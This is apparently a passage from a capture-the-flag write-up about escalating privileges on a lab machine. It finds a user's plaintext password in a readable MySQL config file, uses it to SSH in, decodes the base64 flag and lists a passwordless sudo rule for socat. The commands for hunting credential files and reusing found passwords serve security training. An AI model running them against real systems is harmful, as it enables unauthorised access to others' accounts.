## Privilege Escalation
#### Find "user.txt" flag
```
cd /home/elanya
```
* "www-data" user has no read privileges on "user.txt" file.
```
-rw------- 1 elyana elyana   61 Oct  6  2020 user.txt
```
* "hint.txt" contains "Elyana's user password is hidden in the system. Find it ;)".
**Find all files owned by elyana**
```
find / -user elyana -type f 2>/dev/null

/home/elyana/user.txt
/home/elyana/.bash_logout
/home/elyana/hint.txt
/home/elyana/.bash_history
/home/elyana/.profile
/home/elyana/.sudo_as_admin_successful
/home/elyana/.bashrc
/etc/mysql/conf.d/private.txt
```
* "/etc/mysql/conf.d/private.txt" is readable by "www-data" and contains credentials.
```
ls -la /etc/mysql/conf.d/pricate.txt
-rwxrwxrwx 1 elyana elyana   34 Oct  5  2020 private.txt

cat /etc/mysql/conf.d/private.txt 
user: elyana
password: E@syR18ght
```
**Credentials allow SSH access to target host**
```
ssh elyana@10.10.199.13
elyana@10.10.199.13's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-118-generic x86_64)
[snip ...]
```
**Recovered flag** 
* `VEhNezQ5amc2NjZhbGI1ZTc2c2hydXNuNDlqZzY2NmFsYjVlNzZzaHJ1c259`.
* Decoded Base64 string in CyberChef.
    
* Elyana user has "sudo -l" devolved privileges.
```
id
uid=1000(elyana) gid=1000(elyana) groups=1000(elyana),4(adm),27(sudo),108(lxd)

sudo -l
Matching Defaults entries for elyana on elyana:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User elyana may run the following commands on elyana:
    (ALL) NOPASSWD: /usr/bin/socat
```
